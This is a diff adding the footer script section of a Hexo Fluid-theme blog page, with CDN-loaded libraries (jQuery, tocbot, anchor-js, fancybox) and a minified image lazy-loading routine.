+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</html>
